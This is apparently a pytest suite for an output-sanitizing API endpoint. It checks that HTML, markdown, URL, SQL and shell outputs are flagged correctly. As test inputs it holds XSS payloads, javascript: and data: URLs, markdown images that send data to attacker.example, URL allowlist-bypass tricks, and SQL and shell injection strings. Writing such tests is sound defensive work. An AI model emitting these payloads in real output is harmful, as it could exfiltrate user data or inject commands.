from fastapi.testclient import TestClient

from main import app

client = TestClient(app)

CDN = "cdn-e1njrey.example"
APP = "app-d0mbc0e.example"


def gate(channel, output):
    r = client.post("/sanitize-output", json={"channel": channel, "output": output})
    assert r.status_code == 200
    return r.json()


def reason(channel, output):
    return gate(channel, output)["reason"]


# --- schema ---------------------------------------------------------------

def test_invalid_channel():
    assert reason("json", "hi") == "INVALID_SCHEMA"


def test_non_string_output():
    r = client.post("/sanitize-output", json={"channel": "html", "output": 5})
    assert r.json()["reason"] == "INVALID_SCHEMA"


def test_too_long():
    assert reason("shell", "a" * 20001) == "INVALID_SCHEMA"


def test_max_length_ok():
    assert reason("shell", "a" * 20000) == "SAFE"


# --- benign per channel ---------------------------------------------------

def test_benign_html():
    assert reason("html", "<p>Hello <b>world</b></p>") == "SAFE"


def test_benign_markdown():
    assert reason("markdown", "See [docs](/local/page) for details.") == "SAFE"


def test_benign_url():
    assert reason("url", f"https://{CDN}/asset.png") == "SAFE"


def test_benign_sql():
    assert reason("sql", "SELECT id FROM users WHERE age > 18") == "SAFE"


def test_benign_sql_clean():
    assert reason("sql", "SELECT id FROM users") == "SAFE"


def test_benign_shell():
    assert reason("shell", "ls -la /tmp") == "SAFE"


# --- html -----------------------------------------------------------------

def test_script_tag():
    assert reason("html", "<div><script>x()</script></div>") == "SCRIPT_TAG"


def test_iframe_object_embed():
    for tag in ("iframe", "object", "embed"):
        assert reason("html", f"<{tag} src='/x'></{tag}>") == "SCRIPT_TAG"


def test_event_handler():
    assert reason("html", "<img src=\"/a.png\" onerror=\"alert(1)\">") == "EVENT_HANDLER"


def test_script_before_event_handler():
    assert reason("html", "<script></script><img onerror=x>") == "SCRIPT_TAG"


def test_html_dangerous_scheme():
    assert reason("html", "<a href=\"javascript:alert(1)\">go</a>") == "DANGEROUS_SCHEME"


def test_html_external_exfil():
    assert reason("html", "<img src=\"https://attacker.example/log\">") == "EXTERNAL_EXFIL"


def test_html_allowed_host():
    assert reason("html", f'<img src="https://{CDN}/pic.png">') == "SAFE"


def test_html_relative_ok():
    assert reason("html", '<a href="/local/page">x</a>') == "SAFE"


# --- allowlist precision --------------------------------------------------

def test_subdomain_not_allowed():
    assert reason("url", f"https://evil.{CDN}/x") == "EXTERNAL_EXFIL"


def test_lookalike_host():
    assert reason("url", f"https://{CDN}.attacker.example/x") == "EXTERNAL_EXFIL"


def test_credentials_trick():
    assert reason("url", f"https://{CDN}@attacker.example/") == "EXTERNAL_EXFIL"


def test_query_string_trick():
    assert reason("url", f"https://attacker.example/?next=https://{CDN}/") == "EXTERNAL_EXFIL"


def test_protocol_relative_disallowed_host():
    assert reason("markdown", "![x](//attacker.example/log)") == "EXTERNAL_EXFIL"


def test_protocol_relative_allowed_host():
    assert reason("markdown", f"![x](//{CDN}/pic.png)") == "SAFE"


def test_port_on_allowed_host_ok():
    assert reason("url", f"https://{CDN}:8443/x") == "SAFE"


def test_uppercase_host_ok():
    assert reason("url", f"https://{APP.upper()}/x") == "SAFE"


# --- markdown exfil -------------------------------------------------------

def test_markdown_image_exfil():
    assert reason("markdown", "![](https://attacker.example/?d=secret)") == "EXTERNAL_EXFIL"


def test_markdown_allowed_image():
    assert reason("markdown", f"![logo](https://{APP}/logo.png)") == "SAFE"


def test_markdown_data_scheme():
    assert reason("markdown", "![x](data:text/html,<b>)") == "DANGEROUS_SCHEME"


# --- schemes --------------------------------------------------------------

def test_scheme_with_whitespace():
    assert reason("url", "javascript : alert(1)") == "DANGEROUS_SCHEME"


def test_vbscript():
    assert reason("html", '<a href="vbscript:msgbox">x</a>') == "DANGEROUS_SCHEME"


def test_non_http_scheme_url():
    assert reason("url", "ftp://files.example/x") == "DANGEROUS_SCHEME"


# --- sql / shell ----------------------------------------------------------

def test_sql_variants():
    for bad in ("O'Brien", 'say "hi"', "a; DROP", "x -- c", "a /* c */", "UNION SELECT", "or 1=1"):
        assert reason("sql", bad) == "SQL_METACHAR", bad


def test_shell_variants():
    for bad in ("a; b", "a & b", "a | b", "`id`", "a < f", "a > f", "$(id)", "${X}"):
        assert reason("shell", bad) == "SHELL_METACHAR", bad


# --- encoded --------------------------------------------------------------

def test_percent_encoded_script():
    assert reason("html", "%3Cscript%3Ealert(1)%3C/script%3E") == "ENCODED_PAYLOAD"


def test_entity_encoded_script():
    assert reason("html", "&lt;script&gt;alert(1)&lt;/script&gt;") == "ENCODED_PAYLOAD"


def test_numeric_entity_scheme():
    assert reason("url", "&#106;avascript:alert(1)") == "ENCODED_PAYLOAD"


def test_unicode_escape():
    assert reason("html", "\\u003cscript\\u003e") == "ENCODED_PAYLOAD"


def test_encoded_but_harmless_is_safe():
    assert reason("markdown", "Caf%C3%A9 notes") == "SAFE"


def test_encoded_checked_before_channel_rules():
    # Original already trips SCRIPT_TAG, but decoding changes it and also trips.
    assert reason("html", "<script>%3Ciframe%3E</script>") == "ENCODED_PAYLOAD"


# --- malformed URLs must not 500 ------------------------------------------

def test_malformed_ipv6_does_not_crash():
    for bad in ("https://[::1", "https://[", "https://host:99999/", "http://[bad]:x/"):
        r = client.post("/sanitize-output", json={"channel": "url", "output": bad})
        assert r.status_code == 200, bad
        assert r.json()["safe"] is False, bad


def test_malformed_url_in_html_does_not_crash():
    r = client.post(
        "/sanitize-output",
        json={"channel": "html", "output": '<img src="https://[::1">'},
    )
    assert r.status_code == 200
    assert r.json()["safe"] is False


def test_empty_body_is_invalid_schema():
    r = client.post("/sanitize-output", content=b"", headers={"Content-Type": "application/json"})
    assert r.status_code == 200
    assert r.json()["reason"] == "INVALID_SCHEMA"


def test_non_json_body_is_invalid_schema():
    r = client.post("/sanitize-output", content=b"not json")
    assert r.status_code == 200
    assert r.json()["reason"] == "INVALID_SCHEMA"


def test_json_array_body_is_invalid_schema():
    r = client.post("/sanitize-output", json=["html", "x"])
    assert r.status_code == 200
    assert r.json()["reason"] == "INVALID_SCHEMA"


def test_trailing_slash_does_not_redirect_away():
    r = client.post("/sanitize-output/", json={"channel": "shell", "output": "ls"}, follow_redirects=True)
    assert r.status_code in (200, 404, 405)
